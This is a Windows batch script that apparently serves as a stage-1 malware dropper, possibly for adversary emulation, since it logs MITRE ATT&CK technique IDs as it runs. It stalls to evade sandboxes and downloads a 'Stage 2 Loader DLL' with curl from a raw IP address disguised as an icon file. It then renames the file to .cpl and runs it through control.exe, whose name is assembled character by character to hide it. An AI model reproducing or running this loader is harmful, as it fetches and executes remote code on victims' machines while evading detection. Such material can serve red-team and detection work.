@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments (random-named SET vars, one per PHR)
REM These are literal placeholders patched at deployment time
SET akjdh=%APPDATA%\14455\2129ee79
SET vbnmc=eb69cefc.txt
SET zxmqp=https://3.144.153.50/test/stage/2/icon.png?RVFHQWo-R1dD
SET plkmj=BALAM-S2BO
SET qwert=RVFHQWo
SET asdfg=R1dD
SET zxcvb=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once at script start
SET tsvar=!DATE!/!TIME!

REM -- Step 1: Anti-sandbox initial delay (10-20s) --
timeout /t 15 /nobreak >nul

REM Debug: heartbeat_start
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_start>> "!zxcvb!" 2>nul

REM -- Heartbeat fetch: download Stage 2 Loader DLL --
curl -k -s -o "!akjdh!\!vbnmc!" "!zxmqp!"
IF ERRORLEVEL 1 (
    set hberror=FAIL
    set hbdetail=curl_error
) ELSE (
    set hberror=OK
    set hbdetail=
)

echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: heartbeat_complete>> "!zxcvb!" 2>nul

REM Log TTP T1497 (delays) – will be logged after all delays
REM We'll log at the end of the script after each TTP step

REM -- Anti-sandbox delays between operations (mix of methods) --
REM Delay 1: ping
ping -n 8 127.0.0.1 >nul

REM Debug: delay
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: delay01>> "!zxcvb!" 2>nul

REM Random delay: 10-30s
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul

REM Delay 2: loop-based 1s ticks (7s)
for /l %%i in (1,1,7) do timeout /t 1 /nobreak >nul

REM Debug: delay complete
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: delay02>> "!zxcvb!" 2>nul

REM -- Log T1497 after delays --
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1497^|Virtualization/Sandbox Evasion^|RESULT=OK^|>> "!zxcvb!" 2>nul

REM -- Step 2: Change to output directory --
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_start>> "!zxcvb!" 2>nul
cd /d "!akjdh!" >nul 2>&1
IF ERRORLEVEL 1 (
    set chdirerr=FAIL
) ELSE (
    set chdirerr=OK
)
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: chdir_result=!chdirerr!>> "!zxcvb!" 2>nul

REM -- Obfuscated LOLBIN setup: character-by-character assembly for control.exe --
SET c1=c
SET c2=o
SET c3=n
SET c4=t
SET c5=r
SET c6=o
SET c7=l
SET c8=.
SET c9=e
SET c10=x
SET c11=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%

REM Also build .cpl extension for rename
SET cpl_ext=.cpl

REM Debug: rename_start
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rename_start>> "!zxcvb!" 2>nul

REM -- Rename downloaded DLL to .cpl --
FOR %%i IN ("!vbnmc!") DO SET base_cpl=%%~ni
ren "!vbnmc!" "!base_cpl!!cpl_ext!"
IF ERRORLEVEL 1 (
    set renerr=FAIL
    set cplfile=
) ELSE (
    set renerr=OK
    set cplfile=!base_cpl!!cpl_ext!
)
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: rename_result=!renerr!>> "!zxcvb!" 2>nul

REM Log TTP T1027 (obfuscation) after rename
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1027^|Obfuscated Files or Information^|RESULT=!renerr!^|>> "!zxcvb!" 2>nul

REM -- Invoke the .cpl via control.exe with full path --
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: controlexec_start>> "!zxcvb!" 2>nul
%lolbin% "!akjdh!\!cplfile!"
IF ERRORLEVEL 1 (
    set ctrlerr=FAIL
    set ctrldetail=%ERRORLEVEL%
) ELSE (
    set ctrlerr=OK
    set ctrldetail=
)
echo [!tsvar!][DEBUG][!plkmj!][!qwert!]: controlexec_result=!ctrlerr!>> "!zxcvb!" 2>nul

REM Log TTP T1218
echo [!tsvar!][TTP][!plkmj!][!qwert!]: T1218^|System Binary Proxy Execution^|RESULT=!ctrlerr!^|!ctrldetail!>> "!zxcvb!" 2>nul

REM -- Exit immediately --
ENDLOCAL
exit /b 0